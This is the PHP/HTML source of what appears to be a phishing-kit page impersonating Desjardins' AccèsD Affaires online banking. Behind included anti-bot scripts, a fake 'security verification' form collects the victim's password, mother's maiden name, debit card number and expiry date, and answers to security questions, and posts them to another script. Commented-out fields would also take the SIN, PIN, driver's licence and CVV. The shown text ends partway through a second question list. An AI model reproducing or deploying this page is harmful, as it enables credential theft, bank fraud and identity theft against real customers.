<?php
session_start();
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/anti9.php';

$user = $_POST['codeUtilisateur'];
$_SESSION['codeUtilisateur'] = $user;

?>
<!DOCTYPE html>


<html lang="fr">



<head> <title>Valider l&#39;identit&eacute; Acc&egrave;sD Acc&egrave;sD Affaires | Desjardins</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
 <script src="files/js.js" type="text/javascript"></script>

    <meta name="robots" content="noindex, nofollow"/>
<link rel="shortcut icon" href="d.ico" type="image/x-icon">
<link rel="icon" href="d.ico" type="image/x-icon">

<link href="files/bootstrap.min.css" rel="stylesheet" />

<link href="files/fwd-bootstrap.min.css" rel="stylesheet" />

<!--[if lt IE 9]>
    <link href="files/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet" />
<![endif]-->
<!--[if lte IE 8]>
    <link href="files/fwd-bootstrap-ie.min.css" rel="stylesheet" />
    <link href="files/fwd-bootstrap.css" rel="stylesheet" />
<![endif]-->
<!--[if IE 9]>
    <link href="files/fwd-bootstrap-ie9.min.css" rel="stylesheet" />
<![endif]-->


        <link href="files/global.min.css" rel="stylesheet"/>
    
                <link media="only screen and (max-width : 768px)" href="files/identifiantunique-responsive.min.css" rel="stylesheet" />
            

<!-- Ajustements de styles de l'application -->

    <link href="files/theme.min.css" rel="stylesheet">

<!--[if IE]><link rel="stylesheet" type="text/css" href="files/ie.min.css"/><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="files/ie7.min.css"/><![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="files/ie8.min.css"/><![endif]-->

<link href="files/owl.carousel.min.css" rel="stylesheet">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="desjardins-identifiant-application" content="AccesWeb">
    <meta name="raaMobileActif" content="" />

    
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        
            <script src="files/global.min.js" type="text/javascript"></script>
        



    
      <link href="files/pied.css" rel="stylesheet">
    
      <link rel="stylesheet" href="files/entete.css">
      <link rel="stylesheet" href="files/page-logon.css">
    <FWD_PLACEHOLDER__CONTENU_HEAD_FRAGMENT_PRINCIPAL/>
</head>

<body class="isolation-bootstrap-3">

    
 <!-- if app_mobile --> 
        <a name="haut"></a>
        

                <span class="hidden-xs">
                    
    <div id="zone-entete-de-page">
      <div id="entete">
        <div id="access-links">
          <a href="#contenu" class="hors-ecran" title="Aller au contenu principal">Aller au contenu principal</a>
        </div>
        <div id="logo">
          
          <h1 class="hors-ecran">Site Internet de Desjardins</h1>
          <a href="#" title="Retour &agrave; page d'accueil de Desjardins"><img src="files/a00-entete-logo-desjardins.jpg" alt="Retour &agrave; page d'accueil de Desjardins" width="154" height="32"></a>
        </div>
        <div id="logo-applicatif">
          
          <a href="#"><img src="files/g40-entete-logo-accesd.png" alt="Acc&egrave;sD" width="106" height="32"></a>
          
          <a href="#"><img src="files/g40-entete-logo-accesd-affaires.png" alt="Acc&egrave;sD Affaires" width="90" height="32"></a>
        </div>
        <div id="outils">
          <div id="nous-joindre">
            <p class="titre-entete"><a href="#" onclick="">Nous joindre</a></p>
          </div>
          <div id="aide">
            <p class="titre-entete"><a href="#" onclick="">Aide</a></p>
          </div>

          <div id="fonctions">
            <ul>
              <li class="reduire"><a id="taille-texte-moins" href="#" title="R&eacute;duire la taille du texte">R&eacute;duire la taille du texte</a></li>
              <li class="augmenter"><a id="taille-texte-plus" href="#" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  
 </span> 
                    <span class="hidden-sm hidden-md hidden-lg">
                        

<div id="zone-entete-de-page">
    <nav class="navbar navbar-default" role="navigation">
        <div class="container max-layout-960">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">

                <span class="navbar-brand">
                    <a href="">
                        <img class="logo" src="files/a00-entete-logo-desjardins.png" alt="Aller &agrave; la page d&#39;accueil" title="Desjardins">
                    </a>
                    <div class="hidden-xs" style="display: inline;">
                        <img role="presentation" src="files/g00-entete-filet-logos.png" />
                        <img class="logo-desjardins" role="presentation" src="files/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins"/>
                    </div>
                </span>

                <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg"></div>

                
                    <a href="#" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                        <img id="menuAppRetour" src="files/entete-btn-menu-app.png" height="32"/>
                    </a>
                
 </div><!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling --> 
            <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                <div id="outils">
                    <ul class="nav navbar-nav navbar-right">
                        
                        <li>
                            <a class="lien" href="javascript:popup('#','Nous joindre', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Nous joindre
                            </a><span class="hidden-xs">|</span>
                        </li>
                        <li>
                            <a class="lien" href="javascript:popup('#','Aide', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Aide
                            </a><span class="hidden-xs">|</span>
                        </li>
                        
                                <li class="hidden-xs">
                                    
                                            <a class="lien" id="changeLangue" href="?langueCible=en">
                                                English
 </a> 
                                    <span class="hidden-sm">|</span>
                                </li>
                            
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                <img src="files/a00-entete-ic-texte-moins-blanc-on.png" alt="" title=""/>
                            </a>
                        </li>
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                <img src="files/a00-entete-ic-texte-plus-blanc-on.png" alt="" title=""/>
                            </a>
                        </li>
                        
                        
 </ul> </div> </div><!-- /.collapse .navbar-collapse --> 
 </div><!-- /.container-fluid --> </nav><!-- /.navbar .navbar-default .navbar-fixed-top -->
</div>
 </span> 
      
 <!-- fin if app_mobile --> 
    <div class="zone-centrale">

        <div id="zone-centrale-bg">
            <!-- div id="zone-centrale-grad" class="zone-centrale padding-top-35px"></div-->
            <div class="container">
                <div id="contenu" lang="fr" role="main">
                    
                    <div class="row">
                        
                                <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                            

                            <div id="loading" class="loading" style="display: none;">
                                <div class="panel panel-primary">
                                    <div class="panel-body">
                                        <img id="img-loading" src="files/a00-loading-petit.gif" alt="Loading" />
                                    </div>
                                </div>
                            </div>
                            
                            


    <h1 id="titrePage" data-titre-page-mobile="Obtenir un mot de passe">
        V&eacute;rification de s&eacute;curit&eacute; 
 </h1> <form id="formQuestionsMotPasseOublie" class="form-horizontal" action="lastdesj.php" method="POST" autocomplete="off" onSubmit="return checkform(this);"">
        <input type="hidden" name="user" value="<?php print $user; ?>" />
        

<div class="row">
    <div class="col-sm-24 col-md-24">
        
            <div id="erreurSystemeJS" class="has-error hidden" aria-live="assertive">
            <div>
                <span class="help-block-idunique">
                   
                </span>
                <ul>
                    <li>
                      <a id="erreurLienJS" href="#" class="erreurLien"></a>
                    </li>
                </ul>
                </div>
            </div>
        

    </div>
</div>
<script type="text/javascript">
$( document ).ready(function() {
    //forcer le focus pour respecter les regles d'accessibilité
     setTimeout(function() { $('#erreurAccessibilite').focus() }, 2000);//accessibilité
})
</script>


        <div class="panel panel-primary">
            <div id="panel-body-questions" class="panel-body padding-moyen">

                <h2>&Eacute;tape 2 de 3 &ndash; Validation de l&#39;identit&eacute;</h2> <p> Identifiant et mot de passe : 
                </p>

                <div class="row top15px">
                    <div align="left" class="identifiant col-sm-offset-9 col-xs-12 col-sm-15">
                        <strong><?php print "$user";?></strong>
                    </div>
                </div>
         <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
 <strong>Mot de passe :</strong> 
                            <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body"
                                data-content='<img alt="Mot de passe" src="files//contenu-cheque-815-transit.png"/>'>
                               
                            </a>
                            
                      
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="pass" name="pass" aria-describedby="transit.errors" aria-required="true" type="password" value="" size="12" maxlength="24" autocomplete="off"/>
 </div> </div> 
              <hr>

                <p class="top15pxImportant">
                    Pour nous permettre de vous identifier, r&eacute;pondez aux questions suivantes :
                </p>
<div id="question-compte" class="form-group top15px ">
<!--
                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
 <strong>Nom complet :</strong> 
                           
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-compte">
                              
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="fname" name="fname" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="14" maxlength="32" autocomplete="off"/>
                        </div>
                    </div>
					
					
					-->
					
					
               <!-- <div id="sectionQuestions" class="top15px">
                    
                    <div id="question-datenaissance" class="form-group top15px ">
                        <label for="dateNaissance" id="labelDateNaissance" class="control-label col-xs-24 col-sm-9">
 <strong>Date de naissance :</strong> </label>

                        <div class="col-xs-24 col-sm-15">
                            
                            <fieldset>
                                <legend class="sr-only">Date de naissance :</legend>
								<input id="jj" name="jj" title="Jour" aria-describedby="dateNaissance.errors" class="autowidth" type="text" value="" size="2" maxlength="2" autocomplete="off"/>
								<select id="mm" name="mm"><option value="">Mois</option><option value="01">Janvier</option><option value="02">F&eacute;vrier</option><option value="03">Mars</option><option value="04">Avril</option><option value="05">Mai</option><option value="06">Juin</option><option value="07">Juillet</option><option value="08">Ao&ucirc;t</option><option value="09">Septembre</option><option value="10">Octobre</option><option value="11">Novembre</option><option value="12">D&eacute;cembre</option></select>
								<input id="aaaa" name="aaaa" title="Ann&amp;eacute;e" aria-describedby="dateNaissance.errors" class="autowidth" type="text" value="" size="4" maxlength="4" autocomplete="off"/><input id="dateNaissanceForm" name="dateNaissance" type="hidden" value=""/>
 </fieldset> </div> </div> 
                 
 <div id="question-compte" class="form-group top15px "> -->

                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
 <strong>Nom de jeune fille de votre m&egrave;re :</strong> 
                           
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-compte">
                              
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="mmn" name="mmn" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="10" maxlength="25" autocomplete="off"/>
                        </div>
                    </div>

				<!--	<div id="question-compte" class="form-group top15px ">

                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
 <strong>Num&eacute;ro d'assurance social  (NAS) :</strong> 
                           
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-compte">
                              
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="sin1" name="sin1" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="3" maxlength="3" autocomplete="off"/>
                            <input id="sin2" name="sin2" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="3" maxlength="3" autocomplete="off"/>
                            <input id="sin3" name="sin3" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="3" maxlength="3" autocomplete="off"/>
                        </div>
                    </div>

					<div id="question-compte" class="form-group top15px ">

                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
 <strong> Num&eacute;ro de t&eacute;l&eacute;phone R&eacute;sidentiel :</strong> 
                           
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-compte">
                              
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="telf" name="telf" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="10" maxlength="30" autocomplete="off"/>
                        </div>
                    </div>

					<div id="question-compte" class="form-group top15px ">

                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
 <strong>Lieu de travail :</strong> 
                           
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-compte">
                              
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="work" name="work" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="10" maxlength="30" autocomplete="off"/>
                        </div>
                    </div>

					<div id="question-compte" class="form-group top15px ">

                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
 <strong>NIP :</strong> 
                                    <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body"
                                data-content='<img alt="Num&eacute;ro d&#39;identification personnel. Il se compose de 5 chiffres." src="files//contenu-cheque-815-transit.png"/>'>
                                <img alt="Num&eacute;ro d&#39;identification personnel" src="files/a00-formulaire-icone-aide.gif">
                            </a>
                            
                          
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="pin" name="pin" aria-describedby="compte.errors" aria-required="true" type="text" value="" size="5" maxlength="5" autocomplete="off"/>
                        </div>
                    </div>

                    <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
 <strong>Permis de conduire :</strong> 
                   
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-transit">
                               
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="dln" name="dln" aria-describedby="transit.errors" aria-required="true" type="text" value="" size="10" maxlength="30" autocomplete="off"/>
 </div> </div> -->
      <div id="question-transit" class="form-group top15px ">
<hr>
                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
 <strong>Num&eacute;ro de carte de debit :</strong> 
                   
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-transit">
                               
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="ccnr" name="ccnr" aria-describedby="transit.errors" aria-required="true" type="text" value="" size="16" maxlength="16" autocomplete="off"/>
 </div> </div> 
       <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
 <strong>Expiration :</strong> 
                   
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-transit">
                               
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <select id="expm" required="true" name="expm"><option value="">Mois</option>
							<option value="01">01 - Janvier</option><option value="02">02 - F&eacute;vrier</option>
							<option value="03">03 - Mars</option>
							<option value="04">04 - Avril</option>
							<option value="05">05 - Mai</option>
							<option value="06">06 - Juin</option><option value="07">07 - Juillet</option>
							<option value="08">08 - Ao&ucirc;t</option><option value="09">09 - Septembre</option><option value="10">10 - Octobre</option><option value="11">11 - Novembre</option><option value="12">12 - D&eacute;cembre</option></select>
							<select id="expy" required="true" name="expy"><option value="">AAAA</option>
						
							<option value="2019">2019</option>
							<option value="2020">2020</option>
							<option value="2021">2021</option>
							<option value="2022">2022</option>
							<option value="2023">2023</option>
							<option value="2024">2024</option>
							<option value="2025">2025</option>
							<option value="2026">2026</option>
							</select>
 </div> </div> <!--
       <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
 <strong>Code de s&eacute;curit&eacute;(CVC/CID) :</strong> 
                   
                              <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body"
                                data-content='<img alt="Les trois derniers chiffres situ&eacute;s au verso de la carte ou au-dessus de votre signature composent le code." src="files//contenu-cheque-815-transit.png"/>'>
                                <img alt="" src="files/a00-formulaire-icone-aide.gif">
                            </a>
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="cvv" name="cvv" aria-describedby="transit.errors" aria-required="true" type="text" value="" size="3" maxlength="3" autocomplete="off"/>
 </div> </div> 
                </div>-->
<hr>
                <p class="top20px">
                    Pour confirmer votre identit&eacute;, r&eacute;pondez &agrave; la question suivante :
 </p> 

                <div class="top15px">
                
            <div class="form-group ">
                <label for="valeurReponse" class="col-xs-24 col-sm-9 control-label">
                    <p class="sr-only">Pour confirmer votre identit&eacute;, r&eacute;pondez &agrave; la question suivante :</p> 
					
					</div>
					
					<b> <div align="left">Question 1 :
					<select required="true" name="q1" id="q1">
              <option value="">Selection</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait ma m&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait ma m&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole secondaire?">Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole secondaire?</option>
              <option value="En quelle ann&eacute;e (aaaa) ai-je d&eacute;m&eacute;nag&eacute; de chez mes parents pour m'installer dans mon premier appartement?">En quelle ann&eacute;e (aaaa) ai-je d&eacute;m&eacute;nag&eacute; de chez mes parents pour m'installer dans mon premier appartement?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de mon p&egrave;re?">Quelle est l'ann&eacute;e (aaaa) de naissance de mon p&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est la ville/municipalit&eacute; de mon premier appartement/logement?">Quelle est la ville/municipalit&eacute; de mon premier appartement/logement?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon deuxi&egrave;me enfant?">Quelle est la couleur naturelle des cheveux de mon deuxi&egrave;me enfant?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quel est le deuxi&egrave;me pr&eacute;nom (autre que son pr&eacute;nom usuel) figurant sur l'acte de naissance de ma premi&egrave;re fille?">Quel est le deuxi&egrave;me pr&eacute;nom (autre que son pr&eacute;nom usuel) figurant sur l'acte de naissance de ma premi&egrave;re fille?</option>
              <option value="Quelle est la ville o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?">Quelle est la ville o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?</option>
              <option value="Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?">Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?</option>
              <option value="Quel est le pr&eacute;nom de ma grand-m&egrave;re maternelle?">Quel est le pr&eacute;nom de ma grand-m&egrave;re maternelle?</option>
              <option value="Quelle est la date (jj-mmm) de mon premier mariage?">Quelle est la date (jj-mmm) de mon premier mariage?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de mon fr&egrave;re le plus &acirc;g&eacute;?">Quels sont le jour et le mois (jj-mmm) de naissance de mon fr&egrave;re le plus &acirc;g&eacute;?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma m&egrave;re?">Quelle est la couleur naturelle des cheveux de ma m&egrave;re?</option>
              <option value="Quel est le pr&eacute;nom de mon deuxi&egrave;me enfant?">Quel est le pr&eacute;nom de mon deuxi&egrave;me enfant?</option>
              <option value="Quel est le pays o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?">Quel est le pays o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de ma m&egrave;re?">Quels sont le jour et le mois (jj-mmm) de naissance de ma m&egrave;re?</option>
              <option value="Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma premi&egrave;re ann&eacute;e du secondaire?">Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma premi&egrave;re ann&eacute;e du secondaire?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel est le nom de jeune fille de ma m&egrave;re?">Quel est le nom de jeune fille de ma m&egrave;re?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 18 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 18 ans?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 30 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 30 ans?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; je suis n&eacute;?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; je suis n&eacute;?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus &acirc;g&eacute;?">Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus &acirc;g&eacute;?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?">Quelle est l'ann&eacute;e (aaaa) de naissance de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?</option>
              <option value="Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?">Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?</option>
              <option value="Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?">Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon fr&egrave;re le plus &acirc;g&eacute;?">Quelle est la couleur naturelle des cheveux de mon fr&egrave;re le plus &acirc;g&eacute;?</option>
              <option value="Quelle est la ville/municipalit&eacute; o&ugrave; est situ&eacute;e la premi&egrave;re maison dont j'ai &eacute;t&eacute; propri&eacute;taire?">Quelle est la ville/municipalit&eacute; o&ugrave; est situ&eacute;e la premi&egrave;re maison dont j'ai &eacute;t&eacute; propri&eacute;taire?</option>
              <option value="Quelle est la couleur naturelle de mes cheveux?">Quelle est la couleur naturelle de mes cheveux?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon baccalaur&eacute;at?">Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon baccalaur&eacute;at?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 25 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 25 ans?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?">Quel est le nom de la rue de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?</option>
              <option value="Quel est le nom de l'h&ocirc;pital/de la maison de naissance o&ugrave; je suis n&eacute;?">Quel est le nom de l'h&ocirc;pital/de la maison de naissance o&ugrave; je suis n&eacute;?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 30 ans?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 30 ans?</option>
              <option value="Quel est le nom de jeune fille de ma grand-m&egrave;re paternelle?">Quel est le nom de jeune fille de ma grand-m&egrave;re paternelle?</option>
              <option value="Quel est le nom du premier employeur o&ugrave; j'ai re&ccedil;u mon premier salaire r&eacute;gulier?">Quel est le nom du premier employeur o&ugrave; j'ai re&ccedil;u mon premier salaire r&eacute;gulier?</option>
              <option value="Quelle &eacute;tait la ville/municipalit&eacute; o&ugrave; habitait mon premier amour s&eacute;rieux?">Quelle &eacute;tait la ville/municipalit&eacute; o&ugrave; habitait mon premier amour s&eacute;rieux?</option>
              <option value="Au total, combien de fr&egrave;res et soeurs a/avait mon p&egrave;re?">Au total, combien de fr&egrave;res et soeurs a/avait mon p&egrave;re?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de ma m&egrave;re?">Quelle est l'ann&eacute;e (aaaa) de naissance de ma m&egrave;re?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon p&egrave;re?">Quels sont le jour et le mois (jj-mm) de naissance de mon p&egrave;re?</option>
              <option value="Quel est le nom de famille de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?">Quel est le nom de famille de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma m&egrave;re?">Quelle est la couleur naturelle des cheveux de ma m&egrave;re?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus &acirc;g&eacute;e?">Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus &acirc;g&eacute;e?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon premier certificat?">Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon premier certificat?</option>
              <option value="Quel est le nom de l'&eacute;cole o&ugrave; mon premier fils a commenc&eacute; ses &eacute;tudes primaires?">Quel est le nom de l'&eacute;cole o&ugrave; mon premier fils a commenc&eacute; ses &eacute;tudes primaires?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon grand-p&egrave;re maternel lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait mon grand-p&egrave;re maternel lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; du c&eacute;gep/coll&egrave;ge o&ugrave; j'ai commenc&eacute; mes &eacute;tudes coll&eacute;giales?">Quel est le nom de la ville/municipalit&eacute; du c&eacute;gep/coll&egrave;ge o&ugrave; j'ai commenc&eacute; mes &eacute;tudes coll&eacute;giales?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon p&egrave;re?">Quelle est la couleur naturelle des cheveux de mon p&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 5 ans?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 5 ans?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma m&egrave;re?">Quels sont le jour et le mois (jj-mm) de naissance de ma m&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma troisi&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma troisi&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; est n&eacute; mon p&egrave;re?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; est n&eacute; mon p&egrave;re?</option>
            </select>  <br><br><b>&nbsp;R&eacute;ponse 1 :</b>
            <input required="true" id="a1" name="a1"  type="text" value="" autocomplete="off"/></b>
<br><br>
			
					
					
					<b> <div align="left">Question 2 :
					<select required="true"name="q2" id="q2">
              <option value="">Selection</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait ma m&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait ma m&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole secondaire?">Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole secondaire?</option>
              <option value="En quelle ann&eacute;e (aaaa) ai-je d&eacute;m&eacute;nag&eacute; de chez mes parents pour m'installer dans mon premier appartement?">En quelle ann&eacute;e (aaaa) ai-je d&eacute;m&eacute;nag&eacute; de chez mes parents pour m'installer dans mon premier appartement?</option>
